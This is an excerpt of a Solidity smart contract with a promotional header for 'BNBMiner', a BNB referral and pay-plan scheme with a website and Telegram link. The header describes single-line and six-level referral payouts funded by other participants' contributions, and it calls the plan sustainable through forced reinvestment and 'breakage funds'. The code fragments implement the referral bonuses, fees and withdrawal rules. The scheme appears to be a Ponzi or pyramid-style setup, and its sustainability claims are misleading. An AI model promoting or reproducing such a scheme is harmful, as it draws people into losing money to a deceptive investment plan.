...
/*
-----------------------BNBMINER SMART CONTRACT--------------------------

BNBMiner is a Decentralize, Transparent and Immutable BNB Distribution system.

An Experimental DeFi Project Created to help Same Minded people to leverage 
and Multiple their BNB through BNBMiner Single Line and Unilevel Pay Structure.

BNBMiner Smart Contract Distribute the contribution made by participant in 2 ways

    1. Singleline Pay Structure - New paticipants or contributors are position under the last
        participant in a Singleline, participant earn 1% from the contribution and reinvetments of 
        the 10 people above and from 20 to 50 People under them.
        
        *0.1 - 0.24 BNB Contribution = Get Paid 1% from 10 people above you and from 20 people below you.
        *0.25 - 0.49 BNB Contribution = Get Paid 1% from 10 people above you and from 25 people below you.
        *0.5 - 0.99 BNB Contribution = Get Paid 1% from 10 people above you and from 30 people below you.
        *1.0 - 2.49 BNB Contribution = Get Paid 1% from 10 people above you and from 35 people below you.
        *2.5 - 4.99 BNB Contribution = Get Paid 1% from 10 people above you and from 40 people below you.
        *5.0 - 9.99 BNB Contribution = Get Paid 1% from 10 people above you and from 45 people below you.
        *10 BNB Contribution or more = Get Paid 1% from 10 people above you and from 50 people below you.
        
        
    2. Unilevel Pay Structure - This Pay structure pays active contributors who are bringing in referrals 
        The Smart contract pays up to 6 levels deep.
            
            First Level - 25% 
            2nd Level   - 5% (required 2 directs)
            3rd Level   - 5% (required 3 directs)
            4th Level   - 5% (required 4 directs)
            5th Level   - 5% (required 5 directs)
            6th Level   - 5% (required 6 directs)
            
Safety Net of the Smart contract that makes this Payplan Sustainable:
    *30% to 60% of Participants income is contributed back and This Enhanced pay Structure 
    also utilize the Pay plan Breakage funds.
    
    Breakage Funds is the unallocated or unused portion of the contribution in the payplan.
    ie. one source of Breakage is from package 1 contributors, Because they only gets 30%
    from the 50% allocation for Singleline pay structure so there is a 20% Breakage and 
    there is a other sources of Breakage funds from our pay structure.
        
Website : www.bnbminer.club
Telegram : t.me/bnbminerclub

IMPORTANT NOTE:
Make sure to DYOR and Kindly Contribute only what you can afford to lose!!!
...
contract BNBMiner {
	...
	uint[6] public ref_bonuses = [25,5,5,5,5,5];
    ...
    function invest(address referrer) public payable {
		...
		// 6 Level Referral
		   _refPayout(msg.sender,msgValue);
            ...
            uint256 _fees = msg.value.mul(PROJECT_FEE.div(4)).div(PERCENTS_DIVIDER);
  ...
  function withdrawal() external{
    ...
    uint256 _fees = TotalBonus.mul(PROJECT_FEE.div(4)).div(PERCENTS_DIVIDER);
  ...
  function getEligibleWithdrawal(address _user) public view returns(uint8 reivest, uint8 withdrwal){
      ...
      uint256 TotalDeposit = users[_user].amount;
      if(users[_user].refs[0] >=4 && (TotalDeposit >=0.1 ether && TotalDeposit < 5 ether)){
          reivest = 50;
          withdrwal = 50;
